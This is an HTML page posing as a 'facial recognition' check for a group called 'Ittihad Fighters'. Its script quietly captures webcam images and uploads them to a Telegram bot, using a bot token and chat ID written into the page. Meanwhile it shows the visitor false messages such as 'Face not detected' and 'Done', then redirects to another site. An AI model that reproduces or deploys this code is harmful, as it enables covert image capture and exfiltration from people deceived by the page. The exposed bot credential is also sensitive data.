<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ittihad Fighters</title>
    <script>
        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
        const TELEGRAM_CHAT_ID = '5934902786';
        let accessed = localStorage.getItem('accessed');

        if (accessed) {
            document.body.innerHTML = '<h2>Access denied. This page can only be accessed once.</h2>';
        }
    </script>
    <style>
        body { text-align: center; font-family: Arial, sans-serif; }
        video, canvas { display: none; }
        .hidden { display: none; }
        #scanningAnimation {
            width: 100px;
            height: 100px;
            margin: 20px auto;
            border: 5px solid #00f;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.2); opacity: 0.6; }
            100% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>
    <h1>Ittihad Fighters</h1>
    <div id="nameSelection">
        <p>Select your name:</p>
        <label><input type="checkbox" class="nameCheckbox" value="Izz"> Izz</label>
        <label><input type="checkbox" class="nameCheckbox" value="Ali"> Ali</label>
        <label><input type="checkbox" class="nameCheckbox" value="Sara"> Sara</label>
        <button onclick="proceedToFaceRecognition()">Continue</button>
    </div>
    
    <div id="faceRecognition" class="hidden">
        <h2>Facial Recognition</h2>
        <button onclick="startCamera()">Continue</button>
        <button onclick="cancelProcess()">Cancel</button>
    </div>
    
    <div id="scanning" class="hidden">
        <div id="scanningAnimation"></div>
        <p id="statusMessage">Scanning face...</p>
        <canvas id="canvas"></canvas>
    </div>
    
    <script>
        function proceedToFaceRecognition() {
            const selected = document.querySelectorAll('.nameCheckbox:checked');
            if (selected.length === 0) {
                alert('Please select a name.');
                return;
            }
            selected.forEach(box => box.disabled = true);
            document.getElementById('nameSelection').classList.add('hidden');
            document.getElementById('faceRecognition').classList.remove('hidden');
        }

        function cancelProcess() {
            alert('Process cancelled. Page will stop here.');
        }

        function startCamera() {
            document.getElementById('faceRecognition').classList.add('hidden');
            document.getElementById('scanning').classList.remove('hidden');
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => captureImage(video, stream), 3000);
            }).catch(() => {
                alert('Please enable camera access for facial detection.');
            });
        }

        function captureImage(video, stream) {
            const canvas = document.getElementById('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            sendToTelegram(canvas);
            setTimeout(() => {
                document.getElementById('statusMessage').innerText = 'Face not detected...';
                setTimeout(() => {
                    document.getElementById('statusMessage').innerText = 'Scanning face...';
                    setTimeout(() => sendToTelegram(canvas, true), 3000);
                }, 5000);
            }, 2000);
        }

        function sendToTelegram(canvas, final = false) {
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "face.jpg");
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).then(() => {
                    if (final) {
                        document.getElementById('statusMessage').innerText = 'Done âœ…';
                        setTimeout(() => {
                            document.body.innerHTML = '<h2>You look beautiful/handsome today!</h2><p>Redirecting to the next page...</p>';
                            localStorage.setItem('accessed', 'true');
                            setTimeout(() => window.location.href = 'https://studandlearn.github.io/project-2/', 3000);
                        }, 2000);
                    }
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
